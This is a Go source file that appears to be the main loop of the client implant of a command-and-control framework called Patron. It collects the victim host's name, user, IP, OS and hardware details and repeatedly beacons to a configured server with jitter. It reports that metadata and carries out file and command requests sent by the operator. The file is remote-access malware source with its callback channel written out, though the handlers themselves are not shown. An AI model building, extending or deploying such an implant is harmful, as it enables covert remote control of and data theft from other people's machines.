package main

import (
	"log"
	"time"

	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	TransportProtocol string
)

func main() {
	*client_utils.ClientConfig.ServerIP = ServerIP
	*client_utils.ClientConfig.ServerPort = ServerPort
	*client_utils.ClientConfig.CallbackFrequency = CallbackFrequency
	*client_utils.ClientConfig.CallbackJitter = CallbackJitter
	*client_utils.ClientConfig.TransportProtocol = TransportProtocol

	client_utils.Initialize(LoggingEnabled)
	hostname, username := client_utils.GenerateAgentMetadata()
	filepath := client_utils.GetExecutablePath()
	capabilities := client_utils.DefaultCapabilities()
	logger.Logf(logger.Info, "Collected startup metadata. Hostname: %v. Username: %v", hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		config, err := client_utils.LoadCertificate(RootCert, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			log.Fatalf("Failed to load certificate: %v\n", err)
		}
		logger.Logf(logger.Info, "Creating a beacon using %v:%v/%v", *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		beacon, err := client_utils.EstablishConnection(config, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		agentID, err := client_utils.HandleStartupRequest(beacon, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory, capabilities)
		if err != nil {
			client_utils.HandleError(beacon, "startup", err)
			continue
		}
		sleepDuration, err := client_utils.HandleConfigurationRequest(
			beacon, agentID,
			*client_utils.ClientConfig.ServerIP,
			*client_utils.ClientConfig.ServerPort,
			*client_utils.ClientConfig.CallbackFrequency,
			*client_utils.ClientConfig.CallbackJitter,
			*client_utils.ClientConfig.TransportProtocol,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping for %.2fs", sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Server returned non-positive sleep duration. Skipping sleep.")
		}
	}
}
